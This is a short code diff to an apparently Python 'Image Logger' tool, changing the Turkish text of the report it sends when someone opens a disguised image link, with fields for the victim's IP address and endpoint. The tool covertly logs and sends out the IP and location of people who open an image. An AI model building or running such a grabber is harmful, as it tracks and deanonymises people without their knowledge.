@@ -125,11 +125,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - Birisi Tıkladı!",
+            "title": "Image Logger ",
             "color": config["color"],
-            "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**
+            "description": f"""**My own ;D **
 
-**Bitiş Noktası:** `{endpoint}`
+**File Location:** `{endpoint}`
             
 **IP Adresi:**
 > **IP:** `{ip if ip else 'Unknown'}`
